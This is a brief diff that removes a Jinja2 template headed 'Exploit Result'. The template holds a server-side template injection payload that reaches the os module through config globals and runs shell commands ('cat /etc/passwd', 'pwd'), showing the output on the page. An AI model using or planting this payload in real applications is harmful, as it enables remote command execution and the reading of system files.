@@ -1,6 +1,0 @@
-{% extends "base.html" %}
-{% block content %}
-<h1>Exploit Result:</h1>
-<p>User ID: {{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}</p>
-<p>Current Directory: {{ config.__class__.__init__.__globals__['os'].popen('pwd').read() }}</p>
-{% endblock %}
